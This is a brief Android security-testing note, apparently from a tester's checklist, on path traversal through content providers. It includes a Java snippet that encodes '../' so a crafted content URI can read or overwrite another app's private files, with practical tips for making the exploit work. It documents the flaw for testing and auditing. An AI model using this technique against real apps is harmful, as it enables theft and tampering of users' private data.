## Content Provider — Path Traversal via getLastPathSegment()

**Pattern to look for:** `openFile()` building a `File` from `uri.getLastPathSegment()`
or `uri.getPath()` without canonicalization.

**Exploit technique:** percent-encode traversal slashes before building the URI
(`Uri.encode(target, "")`) so `../` survives Android's path-segment splitting:

```java
String target = "../../../../data/data/<victim.pkg>/<private/path>";
Uri uri = Uri.parse("content://<authority>/" + Uri.encode(target, ""));
getContentResolver().openInputStream(uri);  // read
getContentResolver().openOutputStream(uri); // write (needs file to already exist unless MODE_CREATE is honored)
```

**Gotchas:**
- Package Visibility (API 30+) requires `<queries>` in the attacker manifest for
  the authority, or Android reports the provider as nonexistent.
- Confirm the file actually exists first (`adb shell run-as <victim.pkg> ls -la`)
  — lazily-created app storage means a fresh install has nothing to steal yet.
- Check whether the provider honors the requested `mode` or hardcodes
  `MODE_READ_WRITE`/omits `MODE_CREATE` — determines read-only vs. full write vs.
  overwrite-only impact.
